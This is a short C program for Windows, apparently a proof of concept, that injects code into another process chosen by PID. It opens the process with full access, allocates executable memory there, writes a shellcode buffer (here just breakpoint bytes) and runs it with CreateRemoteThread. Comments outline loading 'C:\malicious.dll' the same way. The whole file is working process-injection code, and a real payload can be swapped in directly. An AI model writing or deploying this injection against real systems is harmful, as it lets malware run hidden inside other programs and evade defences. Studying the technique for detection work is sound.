#include <Windows.h>
#include <stdio.h>

int main(int argc, char **argv) {
    DWORD PID = atoi(argv[1]);
    CHAR shellcode[] = "\xcc\xcc";
    DWORD dwSize = 2;
    DWORD written = 0;
    DWORD dwThreadId = 0;
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
    printf("HANDLE 0x%p\n", hProc);

    VOID *mem = VirtualAllocEx(hProc, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("mem 0x%p\n", mem);

    WriteProcessMemory(hProc, mem, shellcode, dwSize, (SIZE_T *)&written);

    printf("Written %d bytes\n", written);

    // load a dll remotely
    // Write argument into the remote process using WriteProcessMemory
    // address = GetProcAddress(LoadLibrary("kernel32.dll"), "LoadLibraryA");
    // mem = C:\malicious.dll
    // CreateRemoteThread(hProc, NULL, 0, address, mem, ...)

    CreateRemoteThread(hProc, NULL, 0, mem, NULL, 0, &dwThreadId);

    printf("thread ID %d\n", dwThreadId);

    CloseHandle(hProc);

    return 0;
}
